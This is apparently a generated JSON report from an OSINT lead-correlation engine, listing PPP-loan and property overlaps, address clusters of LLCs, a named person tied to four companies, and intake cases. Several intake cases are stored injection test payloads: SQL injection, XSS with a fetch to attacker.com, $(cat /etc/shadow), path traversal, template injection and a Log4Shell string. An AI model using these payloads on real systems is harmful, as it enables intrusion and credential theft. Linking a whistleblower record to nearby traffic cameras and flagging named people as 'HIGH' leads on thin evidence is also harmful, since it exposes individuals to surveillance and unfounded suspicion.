@@ -1,0 +1,2707 @@
+{
+  "generated_at": "2026-09-02T08:38:29.785351+00:00",
+  "generated_at_utc": "2026-09-02T08:39:04.111895+00:00",
+  "repo_root": "C:\\OsintNeoAi",
+  "engine": "auto_leads_correlation_v2",
+  "version": "1.0-cloud-auto",
+  "summary": {
+    "ppp_property_overlap_count": 32,
+    "ppp_orgs_total": 32,
+    "property_orgs_total": 2861,
+    "multi_org_persons_count": 1,
+    "address_clusters_count": 247,
+    "high_risk_ppp_count": 0,
+    "litigation_persons_count": 0,
+    "mutual_aid_leads_count": 217,
+    "csv_datasets_scanned": 79,
+    "total_leads_generated": 248,
+    "elapsed": 34.33
+  },
+  "graph_stats": {
+    "nodes": 17488,
+    "edges": 18712
+  },
+  "leads": [
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "2450 COLORADO BLVD LLC",
+      "entity_name": "2450 COLORADO BLVD LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "A & D LLC",
+      "entity_name": "A & D LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "BONGOS SPORTFISHING LLC",
+      "entity_name": "BONGOS SPORTFISHING LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "COMPASSIONATE CARE HOSPICE LLC",
+      "entity_name": "COMPASSIONATE CARE HOSPICE LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "CROWN WEALTH PROPERTIES LLC",
+      "entity_name": "CROWN WEALTH PROPERTIES LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "DBS-ENTERPRISES LLC",
+      "entity_name": "DBS-ENTERPRISES LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "DEVPRI HOSPITALITY LLC",
+      "entity_name": "DEVPRI HOSPITALITY LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "DRT INVESTMENTS LLC",
+      "entity_name": "DRT INVESTMENTS LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "DRT LLC",
+      "entity_name": "DRT LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "FIRST HIGHLAND LLC",
+      "entity_name": "FIRST HIGHLAND LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "GOLDEN HILLS PROPERTIES LLC",
+      "entity_name": "GOLDEN HILLS PROPERTIES LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "HB LLC",
+      "entity_name": "HB LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "INCUPLACE LLC",
+      "entity_name": "INCUPLACE LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "JBH LLC",
+      "entity_name": "JBH LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "JEK INVESTMENTS LLC",
+      "entity_name": "JEK INVESTMENTS LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "LAZER LLC",
+      "entity_name": "LAZER LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "LIGHTHOUSE CAFE LLC",
+      "entity_name": "LIGHTHOUSE CAFE LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "MERRIMAC PARTNERS LLC",
+      "entity_name": "MERRIMAC PARTNERS LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "NEWPORT BEACH GOLF COURSE LLC",
+      "entity_name": "NEWPORT BEACH GOLF COURSE LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "PPP_PROPERTY_OVERLAP",
+      "severity": "HIGH",
+      "entity_id": "NEWPORT LLC",
+      "entity_name": "NEWPORT LLC",
+      "address": null,
+      "risk_score": null,
+      "flagged_reason": null,
+      "proximity_cctv": [],
+      "evidence": "RECEIVED_PPP + OWNS(PROPERTY) in knowledge graph"
+    },
+    {
+      "vector": "MULTI_ORG_PERSON",
+      "severity": "HIGH",
+      "person_id": "SHU CHIN TSENG",
+      "person_name": "Shu Chin Tseng",
+      "org_count": 4,
+      "org_sample": [
+        "BELAVITA LLC",
+        "BELINGER LLC",
+        "BELLALANCE LLC",
+        "MESAVILLE HOLDINGS LLC"
+      ],
+      "evidence": "Controls 4 orgs via OFFICER_OF/DIRECTOR_OF"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "11770 WARNER AVENUE SUITE 215",
+      "org_count": 60,
+      "org_sample": [
+        "BELINGER LLC",
+        "BELLALANCE LLC",
+        "MESAVILLE HOLDINGS LLC",
+        "BELAVITA LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "60 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "220 NEWPORT CENTER DRIVE UNIT 11-557",
+      "org_count": 57,
+      "org_sample": [
+        "PENINSULA VILLAGE LLC",
+        "PENINSULA VILLAGE LLC",
+        "PENINSULA VILLAGE LLC",
+        "PENINSULA VILLAGE LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "57 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "3187 RED HILL AVENUE SUITE 213",
+      "org_count": 38,
+      "org_sample": [
+        "BELAVITA LLC",
+        "BELAVITA LLC",
+        "BELAVITA LLC",
+        "BELAVITA LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "38 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "620 NEWPORT CENTER DRIVE FL 11TH",
+      "org_count": 37,
+      "org_sample": [
+        "SYNERGY HUNTINGTON LLC",
+        "SYNERGY HUNTINGTON LLC",
+        "JASMINE PLACE ASSOCIATES LLC",
+        "JASMINE PLACE ASSOCIATES LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "37 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "PO BOX 11427",
+      "org_count": 37,
+      "org_sample": [
+        "BBC COACHES LLC",
+        "BBC HOMES LLC",
+        "BBC COACHES LLC",
+        "BBC HOMES LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "37 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "2161 VENTIA",
+      "org_count": 25,
+      "org_sample": [
+        "SUPERIOR BEACH HOMES LLC",
+        "SUPERIOR BEACH HOMES LLC",
+        "SUPERIOR BEACH HOMES LLC",
+        "SUPERIOR BEACH HOMES LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "25 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "PO BOX 1549",
+      "org_count": 24,
+      "org_sample": [
+        "CC REALTY INVESTORS LLC",
+        "LIDO PENINSULA CO LLC",
+        "LIDO PENINSULA CO LLC",
+        "LIDO PENINSULA CO LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "24 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "PO BOX A3879",
+      "org_count": 21,
+      "org_sample": [
+        "BCORE RETAIL GOLDENWEST WARNER LLC",
+        "BCORE RETAIL BROOKHURST ADAMS LLC",
+        "BCORE RETAIL BROOKHURST ADAMS LLC",
+        "BCORE RETAIL BROOKHURST ADAMS LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "21 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "PO BOX 1368",
+      "org_count": 21,
+      "org_sample": [
+        "SLATER I LLC",
+        "SLATER I LLC",
+        "SLATER I LLC",
+        "SLATER I LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "21 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "ADDRESS_SHELL_CLUSTER",
+      "severity": "CRITICAL",
+      "address": "17272 NEWHOPE STREET",
+      "org_count": 20,
+      "org_sample": [
+        "RODECKER COMPANIES LLC",
+        "663 HIBISCUS LLC",
+        "FOUNTAIN VALLEY RENTALS LLC",
+        "ROJACK LLC"
+      ],
+      "proximity_cctv": [],
+      "evidence": "20 ORGs REGISTERED_AT same ADDRESS"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0001",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0002",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0003",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0004",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0005",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0006",
+      "entity_name": "DEAN INNOCENZI",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Logistics Conduit Audit | Quantum Auto Dismantler shipment conduit to 1456 Cedar Lane."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0007",
+      "entity_name": "; DROP TABLE LEADS; DROP TABLE USERS;",
+      "address": "'; DROP TABLE LEADS; DROP TABLE USERS; --",
+      "apn": "DROPTABLELEADSDROPTABLEUSERS",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: '; DROP TABLE leads; DROP TABLE users; -- | '; DROP TABLE leads; DROP TABLE users; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0008",
+      "entity_name": "1 OR 1 = 1 UNION SELECT USERNAME PASSWORD FROM USERS",
+      "address": "1' OR '1'='1' UNION SELECT USERNAME, PASSWORD FROM USERS --",
+      "apn": "1OR11UNIONSELECTUSERNAMEPASSWORDFROMUSERS",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: 1' OR '1'='1' UNION SELECT username, password FROM users -- | 1' OR '1'='1' UNION SELECT username, password FROM users --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0009",
+      "entity_name": "<SCRIPT>ALERT DOCUMENT COOKIE < SCRIPT>",
+      "address": "<SCRIPT>ALERT(DOCUMENT COOKIE)</SCRIPT>",
+      "apn": "SCRIPTALERTDOCUMENTCOOKIESCRIPT",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: <script>alert(document.cookie)</script> | <script>alert(document.cookie)</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0010",
+      "entity_name": "<IMG SRC=X ONERROR= FETCH HTTP: ATTACKER COM?LEAK= +DOCUMENT DOMAIN >",
+      "address": "<IMG SRC=X ONERROR=\"FETCH('HTTP://ATTACKER COM?LEAK='+DOCUMENT DOMAIN)\">",
+      "apn": "IMGSRCXONERRORFETCHHTTPATTACKERCOMLEAKDOCUMENTDOMAIN",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: <img src=x onerror=\"fetch('http://attacker.com?leak='+document.domain)\"> | <img src=x onerror=\"fetch('http://attacker.com?leak='+document.domain)\">"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0011",
+      "entity_name": "$ CAT ETC SHADOW",
+      "address": "$(CAT /ETC/SHADOW)",
+      "apn": "CATETCSHADOW",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: $(cat /etc/shadow) | $(cat /etc/shadow)"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0012",
+      "entity_name": "| CALC EXE PING N 5 127 0 0 1",
+      "address": "| CALC EXE & PING -NORTH 5 127 0 0 1",
+      "apn": "CALCEXEPINGN5127001",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: | calc.exe & ping -n 5 127.0.0.1 | | calc.exe & ping -n 5 127.0.0.1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0013",
+      "entity_name": "WINDOWS SYSTEM32 CMD EXE",
+      "address": "/ / / / / /WINDOWS/SYSTEM32/CMD EXE",
+      "apn": "WINDOWSSYSTEM32CMDEXE",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: ../../../../../../windows/system32/cmd.exe | ../../../../../../windows/system32/cmd.exe"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0014",
+      "entity_name": "{{7*7}} ${T JAVA LANG RUNTIME GETRUNTIME EXEC ID }",
+      "address": "{{7*7}} ${T(JAVA LANG RUNTIME) GETRUNTIME() EXEC('ID')}",
+      "apn": "77TJAVALANGRUNTIMEGETRUNTIMEEXECID",
+      "proximity_cctv": [],
+      "evidence": "Intake submission: {{7*7}} ${T(java.lang.Runtime).getRuntime().exec('id')} | {{7*7}} ${T(java.lang.Runtime).getRuntime().exec('id')}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0015",
+      "entity_name": "\u0000\u0000\u0000\u0000",
+      "address": "\u0000\u0000\u0000\u0000",
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: \u0000\u0000\u0000\u0000 | \u0000\u0000\u0000\u0000"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0016",
+      "entity_name": "WHISTLEBLOWER WITNESS A",
+      "address": "ANAHEIM, CA",
+      "apn": null,
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Disclosure | Evidence of $1.5M COVID relief diversion to Chamber of Commerce."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0017",
+      "entity_name": "WHISTLEBLOWER WITNESS A",
+      "address": "ANAHEIM, CA",
+      "apn": null,
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Disclosure | Evidence of $1.5M COVID relief diversion to Chamber of Commerce."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0018",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0019",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0020",
+      "entity_name": "LARGE PAYLOAD TEST",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Stress Test | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0021",
+      "entity_name": "; DROP TABLE CASES;",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | '; DROP TABLE cases; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0022",
+      "entity_name": "<SCRIPT>ALERT XSS < SCRIPT>",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | <script>alert('XSS')</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0023",
+      "entity_name": "{{7*7}}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | {{7*7}}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0024",
+      "entity_name": "${JNDI:LDAP: EVIL COM A}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ${jndi:ldap://evil.com/a}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0025",
+      "entity_name": "ETC PASSWD",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ../../../../etc/passwd"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0026",
+      "entity_name": "🚨 WHISTLEBLOWER 🕵️‍♂️ ‮REVERSED‬",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: International Corruption | Multi-lingual evidence: 日本語, العربية, 中文, Русский."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0027",
+      "entity_name": "CONCURRENT USER 0",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 0"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0028",
+      "entity_name": "CONCURRENT USER 1",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0029",
+      "entity_name": "CONCURRENT USER 2",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 2"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0030",
+      "entity_name": "CONCURRENT USER 3",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 3"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0031",
+      "entity_name": "CONCURRENT USER 4",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 4"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0032",
+      "entity_name": "CONCURRENT USER 5",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 5"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0033",
+      "entity_name": "CONCURRENT USER 6",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 6"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0034",
+      "entity_name": "CONCURRENT USER 7",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 7"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0035",
+      "entity_name": "CONCURRENT USER 8",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 8"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0036",
+      "entity_name": "CONCURRENT USER 9",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 9"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0037",
+      "entity_name": "CONCURRENT USER 10",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 10"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0038",
+      "entity_name": "CONCURRENT USER 11",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 11"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0039",
+      "entity_name": "CONCURRENT USER 12",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 12"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0040",
+      "entity_name": "CONCURRENT USER 13",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 13"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0041",
+      "entity_name": "CONCURRENT USER 14",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 14"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0042",
+      "entity_name": "CONCURRENT USER 15",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 15"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0043",
+      "entity_name": "CONCURRENT USER 16",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
